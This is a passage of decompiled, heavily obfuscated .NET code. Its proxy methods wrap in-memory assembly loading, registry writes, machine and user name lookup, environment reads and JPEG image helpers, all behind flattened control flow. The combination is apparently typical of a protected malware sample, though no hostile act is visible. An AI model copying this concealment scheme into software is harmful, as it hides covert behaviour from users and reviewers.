            array = (Array) ႰႰ.Ⴗ<Assembly>(obj10 as Assembly, (short) 321, 'ı');
            index2 = 0;
            num5 = 9;
            continue;
          case 9:
            num5 = index2 < (array as string[]).Length ? 14 : (int) ⴗ[182] - (int) ⴗ[27];
            continue;
          case 10:
            goto label_36;
          case 14:
            IConvertible key = (IConvertible) ((string[]) array)[index2];
            (obj7 as Dictionary<string, string>)[(string) key] = (string) key;
            num5 = 5;
            continue;
          default:
            obj10 = (object) ႰႰ.ႥႥ.ႨႣ<Evidence>(ႰႰ.Ⴍ<MemoryStream>((MemoryStream) obj8, 835, 846), (byte[]) null, ႰႰ.ႥႥ.Ⴜ<Assembly>((Assembly) evidenceFactory, 'ă', 258), 'Ȃ', (short) 616);
            num5 = 0;
            continue;
        }
      }
label_38:
      return (object) (Assembly) obj10;
label_36:
      obj10 = (object) (Assembly) (appDomain as AppDomain).GetData(name as string);
      num5 = (int) ⴗ[18] - 175;
      goto label_28;
    }
label_39:
    return (object) null;
  }

  internal static bool Ⴍ([In] DateTime obj0, [In] DateTime obj1, [In] char obj2, [In] char obj3)
  {
    char[] ⴃ = nqcpjoekzw.Ⴃ;
    byte[] ⴗ = Ⴄ.Ⴜ.Ⴗ;
label_3:
    int num1 = 0;
    int num2 = 8;
    bool flag;
    while (true)
    {
      switch (num2)
      {
        case 0:
        case 3:
          goto label_3;
        case 1:
        case 10:
          goto label_11;
        case 2:
          ++num1;
          num2 = 388 < 1552 / 4 - 63 ? (int) ⴃ[261] - 23013 : (int) ⴃ[79] - 27810;
          continue;
        case 5:
        case 6:
          flag = obj0 > obj1;
          num2 = 2;
          continue;
        case 7:
          flag = true;
          num2 = (int) ⴃ[259] - 28489;
          continue;
        case 8:
          int num3;
          switch (((int) obj2 ^ (int) obj3) - 112 ^ num1)
          {
            case 0:
              num3 = 5;
              break;
            default:
              num3 = 7;
              break;
          }
          num2 = num3;
          continue;
        case 9:
          num2 = (int) ⴗ[117] - 21;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (pebdynyveq.Ⴍ);
          num2 = 3;
          continue;
      }
    }
label_11:
    return flag;
  }

  internal static int Ⴀ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] short obj1, [In] int obj2) where \u0021\u00210 : string
  {
    char[] ⴃ = nqcpjoekzw.Ⴃ;
    byte[] ⴗ = Ⴄ.Ⴜ.Ⴗ;
label_3:
    int num1 = 0;
    int num2 = (int) ⴃ[387] - 40237;
    int num3;
    while (true)
    {
      switch (num2)
      {
        case 0:
        case 11:
          num3 = obj2;
          num2 = 1;
          continue;
        case 1:
          ++num1;
          num2 = 612 < 2448 / 4 - 589 ? (int) ⴗ[3] - 214 : 7;
          continue;
        case 2:
        case 10:
          int num4;
          switch (((int) obj1 ^ obj2) - 55 ^ num1)
          {
            case 0:
              num4 = 9;
              break;
            case 1:
              num4 = 6;
              break;
            default:
              num4 = 0;
              break;
          }
          num2 = num4;
          continue;
        case 3:
          num2 = 10;
          continue;
        case 5:
        case 7:
          goto label_13;
        case 6:
          num3 = Conversions.ToInteger((string) obj0);
          num2 = 1;
          continue;
        case 8:
          goto label_3;
        case 9:
          num3 = obj0.Length;
          num2 = 1;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (pebdynyveq.Ⴀ);
          num2 = 8;
          continue;
      }
    }
label_13:
    return num3;
  }

  internal static bool Ⴐ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] char obj1, [In] char obj2) where \u0021\u00210 : string
  {
    byte[] ⴗ = Ⴄ.Ⴜ.Ⴗ;
    char[] ⴃ = nqcpjoekzw.Ⴃ;
label_3:
    int num1 = 0;
    int num2 = (int) ⴗ[7] - 80;
    bool flag;
    int num3;
    while (true)
    {
      switch (num2)
      {
        case 0:
          num2 = num3 % 2 != 0 ? (int) ⴗ[150] - 197 : 4;
          continue;
        case 1:
          flag = Conversions.ToBoolean((string) obj0);
          num2 = 6;
          continue;
        case 2:
          flag = true;
          num2 = 6;
          continue;
        case 3:
        case 11:
          int num4;
          switch (((int) obj1 ^ (int) obj2) - 71 ^ num1)
          {
            case 0:
              num4 = 1;
              break;
            case 1:
              num4 = 9;
              break;
            default:
              num4 = 2;
              break;
          }
          num2 = num4;
          continue;
        case 4:
          goto label_14;
        case 5:
        case 7:
          num2 = (int) ⴗ[116] - 95;
          continue;
        case 6:
          ++num1;
          int num5 = (int) obj1;
          int num6 = num5 * num5;
          num3 = (int) obj1 + num6;
          num2 = 0;
          continue;
        case 8:
          goto label_3;
        case 9:
          flag = File.Exists((string) obj0);
          num2 = (int) ⴃ[314] - 58638;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (pebdynyveq.Ⴐ);
          num2 = (int) ⴗ[217] - 91;
          continue;
      }
    }
label_14:
    return flag;
  }

  internal static RegistryProxy Ⴈ<\u0021\u00210>(
    [In] \u0021\u00210 obj0,
    [In] char obj1,
    [In] int obj2)
    where \u0021\u00210 : ServerComputer
  {
    byte[] ⴗ = Ⴄ.Ⴜ.Ⴗ;
    char[] ⴃ = nqcpjoekzw.Ⴃ;
label_3:
    int num1 = 0;
    int num2 = (int) ⴗ[174] - 23;
    object obj;
    int num3;
    while (true)
    {
      switch (num2)
      {
        case 1:
          obj = (object) null;
          num2 = 2;
          continue;
        case 2:
          ++num1;
          int num4 = (int) obj1;
          int num5 = num4 * num4;
          num3 = (int) obj1 + num5;
          num2 = 9;
          continue;
        case 3:
        case 5:
        case 8:
          int num6;
          switch (((int) obj1 ^ obj2) - 46 ^ num1)
          {
            case 0:
              num6 = 6;
              break;
            default:
              num6 = (int) ⴗ[37] - 159;
              break;
          }
          num2 = num6;
          continue;
        case 4:
        case 7:
          goto label_12;
        case 6:
          obj = (object) obj0.Registry;
          num2 = 2;
          continue;
        case 9:
          num2 = num3 % 2 != 0 ? (int) ⴃ[165] - 36236 : 4;
          continue;
        case 10:
          goto label_3;
        case 11:
          num2 = 5;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (pebdynyveq.Ⴈ);
          num2 = 10;
          continue;
      }
    }
label_12:
    return obj as RegistryProxy;
  }

  internal static string Ⴜ([In] int obj0, [In] int obj1)
  {
    byte[] ⴗ = Ⴄ.Ⴜ.Ⴗ;
    char[] ⴃ = nqcpjoekzw.Ⴃ;
label_3:
    int num1 = 0;
    int num2 = 13;
    IComparable<string> comparable;
    int num3;
    int num4;
    while (true)
    {
      switch (num2)
      {
        case 0:
        case 12:
          comparable = (IComparable<string>) Environment.MachineName;
          num2 = 8;
          continue;
        case 1:
          comparable = (IComparable<string>) Interaction.Command();
          num2 = (int) ⴗ[36] - 34;
          continue;
        case 3:
          goto label_3;
        case 4:
          comparable = (IComparable<string>) Environment.UserName;
          num2 = (int) ⴃ[100] - 47383;
          continue;
        case 5:
        case 6:
          comparable = (IComparable<string>) Path.GetTempFileName();
          num2 = 8;
          continue;
        case 7:
          num2 = 13;
          continue;
        case 8:
          ++num1;
          num3 = 431;
          int num5 = num3;
          num4 = num5 * num5;
          num2 = 9;
          continue;
        case 9:
          num4 = num3 + num4;
          num2 = num4 % 2 != 0 ? (int) ⴗ[191] - 138 : (int) ⴗ[161];
          continue;
        case 10:
          goto label_18;
        case 11:
          comparable = (IComparable<string>) null;
          num2 = 8;
          continue;
        case 13:
          int num6;
          switch ((obj0 ^ obj1) - 69 ^ num1)
          {
            case 0:
              num6 = (int) ⴃ[247] - 40722;
              break;
            case 1:
              num6 = (int) ⴃ[65] - 40189;
              break;
            case 2:
              num6 = 6;
              break;
            case 3:
              num6 = (int) ⴃ[247] - 40721;
              break;
            default:
              num6 = (int) ⴃ[368] - 11014;
              break;
          }
          num2 = num6;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (pebdynyveq.Ⴜ);
          num2 = (int) ⴗ[116] - 95;
          continue;
      }
    }
label_18:
    return (string) comparable;
  }

  internal static string ႷႭ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] char obj1, [In] short obj2) where \u0021\u00210 : Enum
  {
    char[] ⴃ = nqcpjoekzw.Ⴃ;
    byte[] ⴗ = Ⴄ.Ⴜ.Ⴗ;
label_3:
    int num1 = 0;
    int num2 = (int) ⴃ[15] - 51364;
    IEnumerable enumerable;
    while (true)
    {
      switch (num2)
      {
        case 0:
          num2 = (int) ⴃ[178] - 41803;
          continue;
        case 1:
          enumerable = (IEnumerable) obj0.ToString();
          num2 = 7;
          continue;
        case 2:
        case 5:
          goto label_3;
        case 3:
        case 6:
          goto label_12;
        case 7:
          ++num1;
          int num3 = (int) obj1;
          Ⴄ.Ⴜ.Ⴗ[183] = (byte) (((int) Ⴄ.Ⴜ.Ⴗ[183] ^ (int) obj2) & 110);
          num2 = (num3 * num3 + (int) obj1) % 2 == 0 ? (int) ⴗ[36] / 7 : (int) ⴗ[154] - 153;
          continue;
        case 8:
          num2 = 9;
          continue;
        case 9:
          int num4;
          switch (((int) obj2 ^ (int) obj1) - 31 ^ num1)
          {
            case 0:
              num4 = (int) ⴗ[161] - 9;
              break;
            default:
              num4 = 11;
              break;
          }
          num2 = num4;
          continue;
        case 10:
        case 11:
          enumerable = (IEnumerable) null;
          num2 = 7;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (pebdynyveq.ႷႭ);
          num2 = 2;
          continue;
      }
    }
label_12:
    return enumerable as string;
  }

  internal static string ႷႷ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] short obj1, [In] char obj2) where \u0021\u00210 : string
  {
    byte[] ⴗ = Ⴄ.Ⴜ.Ⴗ;
    char[] ⴃ = nqcpjoekzw.Ⴃ;
label_3:
    int num1 = 0;
    int num2 = 12;
    IEquatable<string> equatable;
    while (true)
    {
      switch (num2)
      {
        case 0:
          num2 = (int) ⴗ[11] - 111;
          continue;
        case 1:
        case 5:
          num2 = (int) ⴗ[12];
          continue;
        case 2:
          equatable = (IEquatable<string>) Interaction.Environ((string) obj0);
          num2 = 7;
          continue;
        case 3:
          equatable = (IEquatable<string>) obj0.ToLower();
          num2 = (int) ⴗ[4] - 21;
          continue;
        case 4:
        case 8:
          equatable = (IEquatable<string>) obj0.ToUpper();
          num2 = (int) ⴃ[325] - 51908;
          continue;
        case 6:
          goto label_17;
        case 7:
          ++num1;
          int num3 = (int) obj1;
          num2 = (num3 * num3 + (int) obj1) % 2 == 0 ? 6 : (int) ⴃ[34] - 46701;
          continue;
        case 10:
          num2 = (int) ⴃ[130] - 38007;
          continue;
        case 11:
          equatable = (IEquatable<string>) null;
          goto case 1;
        case 12:
          int num4;
          switch (((int) obj1 ^ (int) obj2) - 37 ^ num1)
          {
            case 0:
              num4 = (int) ⴃ[(int) byte.MaxValue] - 17486;
              break;
            case 1:
              num4 = (int) ⴗ[32] - 35;
              break;
            case 2:
              num4 = 3;
              break;
            default:
              num4 = 11;
              break;
          }
          num2 = num4;
          continue;
        case 13:
          goto label_3;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (pebdynyveq.ႷႷ);
          num2 = (int) ⴗ[220] - 46;
          continue;
      }
    }
label_17:
    return (string) equatable;
  }

  internal static void ႷႠ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] long obj1, [In] short obj2, [In] short obj3) where \u0021\u00210 : MemoryStream
  {
    byte[] ⴗ = Ⴄ.Ⴜ.Ⴗ;
    char[] ⴃ = nqcpjoekzw.Ⴃ;
    int num1 = 2;
    int num2;
    int num3;
    int num4;
    while (true)
    {
      switch (num1)
      {
        case 0:
          num1 = (int) ⴗ[178] - 21;
          continue;
        case 1:
          num3 = 24;
          num4 = 47;
          goto case 9;
        case 3:
        case 4:
          num1 = (int) ⴗ[142] - (int) ⴗ[60];
          continue;
        case 5:
          ++num2;
          goto case 1;
        case 6:
          obj0.Position = obj1;
          goto case 5;
        case 7:
          goto label_13;
        case 8:
          int num5;
          switch (((int) obj3 ^ (int) obj2) - 110 ^ num2)
          {
            case 0:
              num5 = (int) ⴃ[147] - 23813;
              break;
            default:
              num5 = (int) ⴗ[46] - (int) ⴗ[46];
              break;
          }
          num1 = num5;
          continue;
        case 9:
          int num6 = num4;
          int num7 = num3 * 5;
          nqcpjoekzw.Ⴃ[390] = (char) ((int) nqcpjoekzw.Ⴃ[390] - (int) obj3 & 1);
          num1 = 235 > num6 - num7 ? 7 : 4;
          continue;
        default:
          num2 = 0;
          num1 = 8;
          continue;
      }
    }
label_13:;
  }

  internal static bool ႷႳ([In] IntPtr obj0, [In] IntPtr obj1, [In] int obj2, [In] short obj3)
  {
    byte[] ⴗ = Ⴄ.Ⴜ.Ⴗ;
    char[] ⴃ = nqcpjoekzw.Ⴃ;
label_3:
    int num1 = 0;
    int num2 = 2;
    bool flag;
    while (true)
    {
      switch (num2)
      {
        case 0:
        case 1:
          flag = true;
          num2 = (int) ⴃ[168] - 25448;
          continue;
        case 2:
        case 4:
          int num3;
          switch ((obj2 ^ (int) obj3) - 67 ^ num1)
          {
            case 0:
              num3 = (int) ⴗ[114] / 7;
              break;
            default:
              num3 = (int) ⴗ[18] - 179;
              break;
          }
          num2 = num3;
          continue;
        case 3:
        case 8:
          goto label_11;
        case 6:
          ++num1;
          num2 = 713 < 1426 / 2 - 57 ? (int) ⴃ[29] - 5407 : 3;
          continue;
        case 7:
          num2 = 2;
          continue;
        case 9:
          flag = obj0 == obj1;
          num2 = 6;
          continue;
        case 10:
          goto label_3;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (pebdynyveq.ႷႳ);
          num2 = (int) ⴗ[161];
          continue;
      }
    }
label_11:
    return flag;
  }

  internal static Module[] ႷႰ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] int obj1, [In] char obj2) where \u0021\u00210 : Assembly
  {
    char[] ⴃ = nqcpjoekzw.Ⴃ;
    byte[] ⴗ = Ⴄ.Ⴜ.Ⴗ;
label_3:
    int num1 = 0;
    int num2 = (int) ⴃ[391] - 37986;
    Array array;
    int num3;
    while (true)
    {
      switch (num2)
      {
        case 0:
          ++num1;
          int num4 = (int) obj2;
          num3 = num4 * num4;
          goto case 6;
        case 1:
        case 8:
          goto label_3;
        case 2:
        case 3:
          goto label_13;
        case 4:
          num2 = (int) ⴃ[96] - 61555;
          continue;
        case 5:
          array = (Array) null;
          num2 = (int) ⴗ[136] - 252;
          continue;
        case 6:
          num3 = (int) obj2 + num3;
          num2 = 11;
          continue;
        case 7:
          int num5;
          switch ((obj1 ^ (int) obj2) - 106 ^ num1)
          {
            case 0:
              num5 = (int) ⴃ[95] - 18977;
              break;
            default:
              num5 = 5;
              break;
          }
          num2 = num5;
          continue;
        case 10:
          array = (Array) obj0.GetModules();
          num2 = (int) ⴃ[226] - 32882;
          continue;
        case 11:
          num2 = num3 % 2 != 0 ? (int) ⴗ[142] - 247 : 3;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (pebdynyveq.ႷႰ);
          num2 = (int) ⴃ[140] - 10022;
          continue;
      }
    }
label_13:
    return array as Module[];
  }

  internal static Type[] ႷႨ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] char obj1, [In] short obj2) where \u0021\u00210 : Module
  {
    byte[] ⴗ = Ⴄ.Ⴜ.Ⴗ;
label_3:
    int num1 = 0;
    int num2 = (int) ⴗ[7] - 83;
    Array array;
    int num3;
    while (true)
    {
      switch (num2)
      {
        case 0:
          int num4;
          switch (((int) obj2 ^ (int) obj1) - 36 ^ num1)
          {
            case 0:
              num4 = 5;
              break;
            default:
              num4 = 3;
              break;
          }
          num2 = num4;
          continue;
        case 1:
          goto label_12;
        case 2:
          goto label_3;
        case 3:
          array = (Array) null;
          num2 = 4;
          continue;
        case 4:
          ++num1;
          int num5 = (int) obj2;
          int num6 = num5 * num5;
          num3 = (int) obj2 + num6;
          num2 = (int) ⴗ[217] - (int) ⴗ[120];
          continue;
        case 5:
        case 8:
        case 11:
          array = (Array) obj0.GetTypes();
          num2 = 4;
          continue;
        case 6:
          num2 = num3 % 2 != 0 ? 0 : 1;
          continue;
        case 9:
        case 10:
          num2 = (int) ⴗ[21] - 30;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (pebdynyveq.ႷႨ);
          num2 = 2;
          continue;
      }
    }
label_12:
    return array as Type[];
  }

  internal static string ႷႥ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] short obj1, [In] int obj2) where \u0021\u00210 : Type
  {
    byte[] ⴗ = Ⴄ.Ⴜ.Ⴗ;
    char[] ⴃ = nqcpjoekzw.Ⴃ;
label_3:
    int num1 = 0;
    int num2 = (int) ⴃ[388] - 57566;
    IEquatable<string> equatable;
    int num3;
    int num4;
    while (true)
    {
      switch (num2)
      {
        case 0:
          goto label_14;
        case 1:
        case 3:
          ++num1;
          num3 = 306;
          num4 = 579;
          goto case 11;
        case 2:
          num2 = (int) ⴃ[56] - 35207;
          continue;
        case 5:
          goto label_3;
        case 6:
          num2 = (int) ⴃ[283] - 2853;
          continue;
        case 7:
          num2 = 8;
          continue;
        case 8:
          int num5;
          switch (((int) obj1 ^ obj2) - 116 ^ num1)
          {
            case 0:
              num5 = (int) ⴗ[117] - 20;
              break;
            default:
              num5 = 10;
              break;
          }
          num2 = num5;
          continue;
        case 9:
          equatable = (IEquatable<string>) obj0.FullName;
          num2 = (int) ⴗ[144] - 186;
          continue;
        case 10:
          equatable = (IEquatable<string>) null;
          goto case 6;
        case 11:
          num2 = 4632 > num4 - num3 * 8 ? 0 : 7;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (pebdynyveq.ႷႥ);
          num2 = (int) ⴗ[69] - 145;
          continue;
      }
    }
label_14:
    return (string) equatable;
  }

  internal static string ႷႣ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] int obj1, [In] short obj2) where \u0021\u00210 : FileInfo
  {
    char[] ⴃ = nqcpjoekzw.Ⴃ;
label_3:
    int num1 = 0;
    int num2 = 3;
    object obj;
    while (true)
    {
      switch (num2)
      {
        case 0:
          num2 = 3;
          continue;
        case 1:
          num2 = 3;
          continue;
        case 2:
        case 4:
          obj = (object) null;
          num2 = 9;
          continue;
        case 3:
        case 5:
          int num3;
          switch (((int) obj2 ^ obj1) - 44 ^ num1)
          {
            case 0:
              num3 = 6;
              break;
            default:
              num3 = (int) ⴃ[273] - 5921;
              break;
          }
          num2 = num3;
          continue;
        case 6:
          obj = (object) obj0.Name;
          num2 = 9;
          continue;
        case 8:
          goto label_12;
        case 9:
          ++num1;
          int num4 = (int) obj2;
          num2 = (num4 * num4 + (int) obj2) % 2 == 0 ? (int) ⴃ[369] - 30590 : (int) ⴃ[191] - 52187;
          continue;
        case 11:
          goto label_3;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (pebdynyveq.ႷႣ);
          num2 = (int) ⴃ[325] - 51904;
          continue;
      }
    }
label_12:
    return (string) obj;
  }

  internal static string ႷႤ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] char obj1, [In] short obj2) where \u0021\u00210 : DirectoryInfo
  {
    char[] ⴃ = nqcpjoekzw.Ⴃ;
    byte[] ⴗ = Ⴄ.Ⴜ.Ⴗ;
label_3:
    int num1 = 0;
    int num2 = 8;
    IEnumerable<char> chars;
    int num3;
    while (true)
    {
      switch (num2)
      {
        case 0:
          num2 = 702 > 117 - num3 * 6 ? (int) ⴗ[79] - 137 : 1;
          continue;
        case 1:
          num2 = 8;
          continue;
        case 2:
          chars = (IEnumerable<char>) null;
          num2 = 5;
          continue;
        case 4:
        case 9:
          chars = (IEnumerable<char>) obj0.Name;
          num2 = 5;
          continue;
        case 5:
        case 7:
          ++num1;
          num3 = 21;
          goto case 0;
        case 6:
          goto label_13;
        case 8:
          int num4;
          switch (((int) obj2 ^ (int) obj1) - 57 ^ num1)
          {
            case 0:
              num4 = 4;
              break;
            default:
              num4 = (int) ⴃ[69] - 10102;
              break;
          }
          num2 = num4;
          continue;
        case 10:
          goto label_3;
        case 11:
          num2 = (int) ⴗ[198] - 43;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (pebdynyveq.ႷႤ);
          num2 = (int) ⴃ[133] - 42666;
          continue;
      }
    }
label_13:
    return chars as string;
  }

  internal static string ႷႼ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] short obj1, [In] char obj2) where \u0021\u00210 : FileSystemInfo
  {
    byte[] ⴗ = Ⴄ.Ⴜ.Ⴗ;
    char[] ⴃ = nqcpjoekzw.Ⴃ;
label_3:
    int num1 = 0;
    int num2 = (int) ⴗ[119] - 181;
    IEquatable<string> equatable;
    int num3;
    while (true)
    {
      switch (num2)
      {
        case 0:
        case 7:
          goto label_12;
        case 1:
          equatable = (IEquatable<string>) obj0.FullName;
          num2 = (int) ⴗ[142] - (int) ⴗ[52];
          continue;
        case 3:
        case 11:
          num2 = (int) ⴃ[48] - 57333;
          continue;
        case 4:
          num2 = num3 % 2 != 0 ? 8 : 7;
          continue;
        case 5:
          goto label_3;
        case 6:
        case 10:
          equatable = (IEquatable<string>) null;
          num2 = 9;
          continue;
        case 8:
          int num4;
          switch (((int) obj2 ^ (int) obj1) - 47 ^ num1)
          {
            case 0:
              num4 = 1;
              break;
            default:
              num4 = (int) ⴃ[37] - 63370;
              break;
          }
          num2 = num4;
          continue;
        case 9:
          ++num1;
          int num5 = (int) obj2;
          int num6 = num5 * num5;
          num3 = (int) obj2 + num6;
          num2 = (int) ⴃ[371] - 19588;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (pebdynyveq.ႷႼ);
          num2 = 5;
          continue;
      }
    }
label_12:
    return (string) equatable;
  }

  internal static void ႠႭ<\u0021\u00210, \u0021\u00211, \u0021\u00212>(
    [In] \u0021\u00210 obj0,
    [In] \u0021\u00211 obj1,
    [In] \u0021\u00212 obj2,
    [In] int obj3,
    [In] char obj4)
    where \u0021\u00210 : RegistryKey
    where \u0021\u00211 : string
    where \u0021\u00212 : object
  {
    byte[] ⴗ = Ⴄ.Ⴜ.Ⴗ;
    int num1 = 4;
    int num2;
    while (true)
    {
      switch (num1)
      {
        case 0:
          obj0.SetValue((string) obj1, (object) obj2);
          goto case 9;
        case 2:
          goto label_11;
        case 3:
        case 5:
          num1 = (int) ⴗ[22] - 121;
          continue;
        case 7:
          int num3;
          switch ((obj3 ^ (int) obj4) - 52 ^ num2)
          {
            case 0:
              num3 = 0;
              break;
            default:
              num3 = 8;
              break;
          }
          num1 = num3;
          continue;
        case 8:
          num1 = (int) ⴗ[118] - 8;
          continue;
        case 9:
          ++num2;
          int num4 = (int) obj4;
          num1 = (num4 * num4 + (int) obj4) % 2 == 0 ? 2 : 5;
          continue;
        default:
          num2 = 0;
          num1 = (int) ⴗ[12];
          continue;
      }
    }
label_11:;
  }

  internal static string ႠႷ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] int obj1, [In] short obj2) where \u0021\u00210 : Exception
  {
    char[] ⴃ = nqcpjoekzw.Ⴃ;
    byte[] ⴗ = Ⴄ.Ⴜ.Ⴗ;
label_3:
    int num1 = 0;
    int num2 = 7;
    IConvertible convertible;
    while (true)
    {
      switch (num2)
      {
        case 0:
          goto label_3;
        case 1:
        case 11:
          convertible = (IConvertible) obj0.Message;
          num2 = (int) ⴗ[161];
          continue;
        case 2:
          goto label_14;
        case 3:
          convertible = (IConvertible) null;
          goto case 5;
        case 4:
          int num3 = (int) obj2;
          num2 = (num3 * num3 + (int) obj2) % 2 == 0 ? 2 : (int) ⴗ[59] - 135;
          continue;
        case 5:
          num2 = (int) ⴗ[161];
          continue;
        case 7:
          int num4;
          switch ((obj1 ^ (int) obj2) - 110 ^ num1)
          {
            case 0:
              num4 = 1;
              break;
            default:
              num4 = (int) ⴃ[211] - 41015;
              break;
          }
          num2 = num4;
          continue;
        case 8:
          num2 = 7;
          continue;
        case 9:
          num2 = 7;
          continue;
        case 10:
          ++num1;
          goto case 4;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (pebdynyveq.ႠႷ);
          num2 = (int) ⴃ[393] - 23632;
          continue;
      }
    }
label_14:
    return convertible as string;
  }

  internal static object ႠႠ<\u0021\u00210, \u0021\u00211>(
    [In] \u0021\u00211 obj0,
    [In] \u0021\u00210 obj1,
    [In] bool obj2,
    [In] char obj3,
    [In] short obj4)
    where \u0021\u00210 : object
    where \u0021\u00211 : object
  {
    byte[] ⴗ = Ⴄ.Ⴜ.Ⴗ;
    char[] ⴃ = nqcpjoekzw.Ⴃ;
label_3:
    int num1 = 0;
    int num2 = 8;
    object obj;
    while (true)
    {
      switch (num2)
      {
        case 0:
        case 4:
          num2 = (int) ⴃ[377] - 4430;
          continue;
        case 1:
          obj = (object) null;
          num2 = 5;
          continue;
        case 2:
        case 9:
          goto label_3;
        case 3:
        case 5:
          ++num1;
          num2 = 325 < 1300 / 4 - 232 ? (int) ⴃ[251] - 59112 : (int) ⴃ[296] - 6106;
          continue;
        case 6:
          goto label_11;
        case 7:
          obj = Operators.CompareObjectEqual((object) obj0, (object) obj1, obj2);
          num2 = (int) ⴃ[384] - 21320;
          continue;
        case 8:
          int num3;
          switch (((int) obj3 ^ (int) obj4) - 108 ^ num1)
          {
            case 0:
              num3 = (int) ⴃ[51] - 23031;
              break;
            default:
              num3 = (int) ⴗ[21] - (int) ⴗ[117];
              break;
          }
          num2 = num3;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (pebdynyveq.ႠႠ);
          num2 = 2;
          continue;
      }
    }
label_11:
    return obj;
  }

  internal static bool ႠႳ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] int obj1, [In] int obj2) where \u0021\u00210 : object
  {
    byte[] ⴗ = Ⴄ.Ⴜ.Ⴗ;
    char[] ⴃ = nqcpjoekzw.Ⴃ;
label_3:
    int num1 = 0;
    int num2 = 0;
    bool flag;
    while (true)
    {
      switch (num2)
      {
        case 0:
          int num3;
          switch ((obj2 ^ obj1) - 29 ^ num1)
          {
            case 0:
              num3 = (int) ⴃ[229] - 32666;
              break;
            default:
              num3 = (int) ⴗ[177] - 119;
              break;
          }
          num2 = num3;
          continue;
        case 1:
        case 4:
        case 10:
          flag = Conversions.ToBoolean((object) obj0);
          num2 = (int) ⴗ[187] - 165;
          continue;
        case 2:
          ++num1;
          num2 = 3115 > 445 - 57 * 7 ? 3 : 5;
          continue;
        case 3:
          goto label_12;
        case 5:
          num2 = 0;
          continue;
        case 6:
          goto label_3;
        case 8:
        case 9:
          flag = true;
          num2 = 2;
          continue;
        case 11:
          num2 = 0;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (pebdynyveq.ႠႳ);
          num2 = (int) ⴗ[47] - 183;
          continue;
      }
    }
label_12:
    return flag;
  }

  internal static Graphics ႠႰ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] int obj1, [In] char obj2) where \u0021\u00210 : Image
  {
    byte[] ⴗ = Ⴄ.Ⴜ.Ⴗ;
    char[] ⴃ = nqcpjoekzw.Ⴃ;
label_3:
    int num1 = 0;
    int num2 = (int) ⴗ[210] - 152;
    object obj;
    int num3;
    while (true)
    {
      switch (num2)
      {
        case 0:
        case 9:
          ++num1;
          goto case 7;
        case 1:
          goto label_3;
        case 2:
          obj = (object) null;
          num2 = 0;
          continue;
        case 3:
          goto label_13;
        case 4:
          obj = (object) Graphics.FromImage((Image) obj0);
          num2 = 0;
          continue;
        case 5:
          num2 = num3 % 2 != 0 ? (int) ⴃ[288] - 44097 : 3;
          continue;
        case 6:
          int num4;
          switch (((int) obj2 ^ obj1) - 71 ^ num1)
          {
            case 0:
              num4 = (int) ⴃ[139] - 6330;
              break;
            default:
              num4 = 2;
              break;
          }
          num2 = num4;
          continue;
        case 7:
        case 11:
          int num5 = (int) obj2;
          int num6 = num5 * num5;
          num3 = (int) obj2 + num6;
          num2 = (int) ⴗ[12] - 2;
          continue;
        case 8:
          num2 = 6;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (pebdynyveq.ႠႰ);
          num2 = 1;
          continue;
      }
    }
label_13:
    return obj as Graphics;
  }

  internal static ImageFormat ႠႨ([In] int obj0, [In] char obj1)
  {
    byte[] ⴗ = Ⴄ.Ⴜ.Ⴗ;
label_3:
    int num1 = 0;
    int num2 = 10;
    object obj;
    while (true)
    {
      switch (num2)
      {
        case 2:
        case 7:
          obj = (object) null;
          num2 = 6;
          continue;
        case 3:
          num2 = 10;
          continue;
        case 4:
        case 9:
          goto label_12;
        case 5:
          num2 = (int) ⴗ[161];
          continue;
        case 6:
          ++num1;
          int num3 = (int) obj1;
          num2 = (num3 * num3 + (int) obj1) % 2 == 0 ? 4 : 3;
          continue;
        case 8:
          obj = (object) ImageFormat.Jpeg;
          num2 = 6;
          continue;
        case 10:
          int num4 = ((int) obj1 ^ obj0) - 115;
          int num5 = num1;
          Ⴄ.Ⴜ.Ⴗ[10] = (byte) ((int) Ⴄ.Ⴜ.Ⴗ[10] + obj0 & 122);
          int num6;
          switch (num4 ^ num5)
          {
            case 0:
              num6 = 8;
              break;
            default:
              num6 = 2;
              break;
          }
          num2 = num6;
          continue;
        case 11:
          goto label_3;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (pebdynyveq.ႠႨ);
          num2 = 11;
          continue;
      }
    }
label_12:
